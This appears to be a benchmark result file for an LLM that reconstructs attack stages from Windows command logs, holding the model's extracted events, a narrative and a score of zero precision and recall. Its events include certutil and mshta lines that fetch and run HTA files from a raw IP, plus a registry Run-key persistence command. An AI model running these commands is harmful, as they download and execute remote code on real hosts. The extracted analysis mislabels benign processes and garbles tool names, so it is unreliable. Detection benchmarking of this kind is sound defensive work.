@@ -1,0 +1,80 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=storage.mojom.StorageService --lang=zh-CN --service-sandbox-type=utility --mojo-platform-channel-handle=2572 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:8",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sethc.exe /AccessibilitySoundAgent",
+        "stage": "Persistence"
+      },
+      {
+        "command": "searchprotocolhost.exe Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-2860491236-3051596471-1450068755-50059_ Global\\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-2860491236-3051596471-1450068755-50059 1 -2147483646 ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "Attackers initiated their campaign through MS Edge\u2019s storage service, employing stealth techniques like resource hijacking and exploiting certificate tools such as CerUtil and HTA files. They maintained persistence via modified accessibility shortcuts and registry entries while executing PS scripts for additional control. The narrative highlights initial access, defense evasion, persistence, and execution phases.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91244,
+      "completion_tokens": 10146,
+      "total_tokens": 101390,
+      "wall_clock_s": 220.211,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 37
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 37,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.09090909090909091,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 91244,
+      "completion_tokens": 10146,
+      "total_tokens": 101390,
+      "wall_clock_s": 220.211,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
